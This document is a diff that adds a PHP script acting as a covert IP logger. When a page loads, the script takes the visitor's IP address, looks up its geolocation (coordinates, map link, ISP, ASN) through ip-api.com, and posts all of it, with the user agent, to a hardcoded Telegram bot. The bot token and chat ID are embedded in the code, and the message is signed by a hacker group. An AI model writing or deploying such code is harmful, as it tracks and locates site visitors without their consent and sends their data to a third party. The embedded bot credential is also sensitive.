@@ -1,0 +1,82 @@
+<?php
+function getClientIP() {
+    // Check for shared internet or proxy
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        // Check for IPs passed from proxies
+        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ip = trim($ipList[0]); // First IP is the real client IP
+    } else {
+        // Default: use REMOTE_ADDR
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+
+    // Validate IP address format
+    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
+}
+
+function getGeoLocation($ip) {
+    $apiUrl = "http://ip-api.com/json/$ip";
+    $response = file_get_contents($apiUrl); // Fetch data from API
+    $data = json_decode($response, true); // Decode JSON response
+
+    return ($data['status'] === 'success') ? $data : ['error' => 'Unable to fetch geolocation'];
+}
+
+// Get client IP
+$clientIP = getClientIP();
+
+// Get geolocation for the IP
+$geoData = getGeoLocation($clientIP);
+
+// Display the information
+$moyy = "Client IP: $clientIP\n";
+$mop = isset($geoData['error']) ? "Geolocation Error: " . $geoData['error'] : "";
+$moy = isset($geoData['continent']) ? "Continent: " . $geoData['continent'] . "\n" : "";
+$moya = isset($geoData['continentCode']) ? "ContinentCode: " . $geoData['continentCode'] . "\n" : "";
+$moyb = isset($geoData['regionName']) ? "Region: " . $geoData['regionName'] . "\n" : "";
+$moyc = isset($geoData['region']) ? "RegionCode: " . $geoData['region'] . "\n" : "";
+$moyd = isset($geoData['lat']) ? "Latitude: " . $geoData['lat'] . "\n" : "";
+$moye = isset($geoData['lon']) ? "Longitude: " . $geoData['lon'] . "\n" : "";
+$moyf = isset($geoData['lat']) && isset($geoData['lon']) ? "Maps: https://www.google.com/maps?q=" . $geoData['lat'] . "," . $geoData['lon'] . "\n" : "";
+$moyg = isset($geoData['eu']) ? "EU: " . ($geoData['eu'] ? 'True' : 'False') . "\n" : "";
+$moyh = isset($geoData['zip']) ? "Postal: " . $geoData['zip'] . "\n" : "";
+$moyi = isset($geoData['countryCode']) ? "CallingCode: " . $geoData['countryCode'] . "\n" : "";
+$moyj = isset($geoData['capital']) ? "Capital: " . $geoData['capital'] . "\n" : "";
+$moyk = isset($geoData['borders']) ? "Borders: " . implode(', ', $geoData['borders']) . "\n" : "";
+$moyl = isset($geoData['countryCode']) ? "CountryFlag: https://www.countryflags.io/" . $geoData['countryCode'] . "/flat/64.png\n" : "";
+$moym = isset($geoData['as']) ? "ASN: " . $geoData['as'] . "\n" : "";
+$moyn = isset($geoData['org']) ? "ORG: " . $geoData['org'] . "\n" : "";
+$moyo = isset($geoData['isp']) ? "ISP: " . $geoData['isp'] . "\n" : "";
+$moyp = isset($geoData['reverse']) ? "Domain: " . $geoData['reverse'] . "\n" : "";
+$moyq = isset($geoData['query']) ? "ID: " . $geoData['query'] . "\n" : "";
+$moyr = isset($geoData['countryCode']) ? "ABBR: " . $geoData['countryCode'] . "\n" : "";
+$moys = isset($geoData['dst']) ? "DST: " . $geoData['dst'] . "\n" : "";
+$moyt = isset($geoData['offset']) ? "Offset: " . $geoData['offset'] . "\n" : "";
+$moyu = isset($geoData['timezone']) ? "UTC: " . $geoData['timezone'] . "\n" : "";
+$mop .= "Google Map Link: " . $moyf;
+
+$chatID = "6260002708";
+$token = "7935094184:AAEtCkwxmdKbOvKZuWmkBFRdxF702BaX0xo";
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+
+$data = array(
+    'chat_id' => $chatID,
+    'text' => "[== IP Information==]\n$moyy\n$mop\n$moy\n$moya\n$moyb\n$moyc\n$moyd\n$moye\n$moyf\n$moyg\n$moyh\n$moyi\n$moyj\n$moyk\n$moyl\n$moym\n$moyn\n$moyo\n$moyp\n$moyq\n$moyr\n$moys\n$moyt\n$moyu\nUser Agent: $user_agent\n Watchzone:\nDECODE HACKERS PH!!!"
+);
+
+$url = "https://api.telegram.org/bot$token/sendMessage";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$result = curl_exec($ch);
+curl_close($ch);
+
+// Debugging output
+file_put_contents('debug_log.txt', "CURL Result: $result\n", FILE_APPEND);
+?>
